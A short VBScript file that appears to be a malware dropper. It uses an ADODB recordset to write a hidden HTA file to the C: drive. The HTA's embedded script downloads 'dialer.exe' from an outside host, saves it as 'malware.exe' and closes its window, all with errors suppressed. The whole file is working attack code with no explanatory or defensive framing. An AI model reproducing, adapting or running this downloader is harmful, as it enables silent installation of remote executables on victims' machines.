
on error resume next
set conn = CreateObject("ADODB.Recordset")
   With conn
       .Fields.Append "conn", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("conn").Value = "<body style=""display:none"" scroll=""no"">"
       Call .AddNew
       .Fields("conn").Value = "<script language=""vbscript"">: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://nahuy.biz/dialer.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\malware.exe"",2 : window.close()</script>"
       Call .Update
   End With
conn.Save "C:\cmdexe.hta", adPersistXML
conn.Close


